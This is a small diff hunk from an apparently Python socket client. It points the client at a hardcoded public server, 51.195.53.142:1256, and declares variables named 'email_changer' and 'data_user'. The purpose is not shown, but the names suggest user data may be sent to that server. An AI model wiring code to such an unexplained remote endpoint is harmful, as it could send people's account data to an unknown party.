@@ -37,7 +37,7 @@ s = socket.socket()
 
 # Server information
 ## 51.195.19.3
-s.connect(('0.0.0.0', 1256))
+s.connect(('51.195.53.142', 1256))
 
 email_changer = ''
 data_user = []
